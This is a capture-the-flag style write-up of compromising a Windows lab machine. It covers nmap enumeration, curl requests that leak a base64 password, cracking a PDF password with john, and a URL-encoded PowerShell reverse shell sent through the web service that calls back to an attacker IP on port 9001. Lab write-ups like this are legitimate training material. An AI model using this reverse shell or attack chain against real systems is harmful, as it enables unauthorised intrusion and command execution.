#Pwned! 
```IP
192.168.242.99
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.242.99 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 125 FileZilla ftpd
| ftp-syst:                      
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           syn-ack ttl 125 OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:                 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYR4Bx82VWETlsjIFs21j6lZ6/S40jMJvuXF+ay4Qz4b+ws2YobB5h0+IrHdr3epMNFmSY8JXFWzIILhkvF/rmadXRtGwib1VZkSa3nr5oYdMajoWK0jOVSoFJmDTJvhj+T3XE7+Q0tEkQ2EeGPrz7nK5XWzBp8SZdywCE/iz1HLvUIlsOqpDWHSjrnjkUaaleT
goVTEi63Dx4inY2KS5mX2mnS/mLzMlLZ0qj8vL9gz6ZJgf7LMNhXb/pWOtxfn6zmSoVHXEXgubXwLtrn4wOIvbZkm5/uEx+eFzx1AOEQ2LjaKItEqLlP3E5sdutVP6yymDTGBtlXgfvtfGS2lgZiitorAXjjND6Sqcppp5lQJk2XSBJC58U0SzjXdyflJwsus5mnKnX79nKxXPNPwM6Z3Ki1O9vE+KsJ1dZJuaTINVg
LqrgwJ7BCkI2HyojfqzjHs4FlYVHnukjqunG90OMyAASSR0oEnUTPqFmrtL/loEc3h44GT+8m9JS1LgdExU= 
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)      
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJYE805huwKUl0fJM8+N9Mk7GUQeEEc5iA/yYqgxE7Bwgz4h5xufRONkR6bWxcxu8/AHslwkkDkjRKNdr4uFzY=
|   256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8cLYuHBTVFfYPb/YzUIyT39bUzA/sPDFEC/xChZyZ4
80/tcp    open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:                                                                                                      
|_  Supported Methods: GET
|_http-title: Site doesn't have a title.
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8089/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
| http-methods:
|_  Supported Methods: GET
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:                         
|_  Supported Methods: GET POST
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E    
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## FTP
FileZilla Server 0.9.60 beta
brute not working
## SMB
guest and blank not working
## RPC
blank nothing
## SNMP
snmpwalk nothing
## HTTP 80
doesnt work apparently

## HTTP 8089
ffuf big.txt nothing

## HTTP 33333
ffuf big.txt nothing
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241209164529.png?raw=true)

# Exploitation

http 8089 request/response
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241209165628.png?raw=true)

IP harcoded. Lets try the same request with target IP
```
curl -i 192.168.164.99:33333/list-running-procs -v
```
```
curl -i 192.168.164.99:33333/list-running-procs -v -X POST
```
```
curl -i 192.168.164.99:33333/list-running-procs -v -X POST -H 'Content-Length: 0'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210094000.png?raw=true)

```
echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d
```
```
NowiseSloopTheory139
```
```
ariah
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210094421.png?raw=true)
# PrivEsc

## Manual
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
cmdkey /list
%SystemRoot%\system32\shell32.dll

we see a ftp directory in / so we get via FTP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101346.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101359.png?raw=true)
```
pdf2john Infrastructure.pdf > pdf.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101956.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101942.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210103111.png?raw=true)
We now execute a reverse shell:
```
{% raw %}
http://192.168.164.99/?$LHOST%20=%20%22192.168.45.189%22;%20$LPORT%20=%209001;%20$TCPClient%20=%20New-Object%20Net.Sockets.TCPClient($LHOST,%20$LPORT);%20$NetworkStream%20=%20$TCPClient.GetStream();%20$StreamReader%20=%20New-Object%20IO.StreamReader($NetworkStream);%20$StreamWriter%20=%20New-Object%20IO.StreamWriter($NetworkStream);%20$StreamWriter.AutoFlush%20=%20$true;%20$Buffer%20=%20New-Object%20System.Byte[]%201024;%20while%20($TCPClient.Connected)%20{%20while%20($NetworkStream.DataAvailable)%20{%20$RawData%20=%20$NetworkStream.Read($Buffer,%200,%20$Buffer.Length);%20$Code%20=%20([text.encoding]::UTF8).GetString($Buffer,%200,%20$RawData%20-1)%20};%20if%20($TCPClient.Connected%20-and%20$Code.Length%20-gt%201)%20{%20$Output%20=%20try%20{%20Invoke-Expression%20($Code)%202%3E&1%20}%20catch%20{%20$_%20};%20$StreamWriter.Write(%22$Output`n%22);%20$Code%20=%20$null%20}%20};%20$TCPClient.Close();%20$NetworkStream.Close();%20$StreamReader.Close();%20$StreamWriter.Close()
{% endraw %}
```


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210104644.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

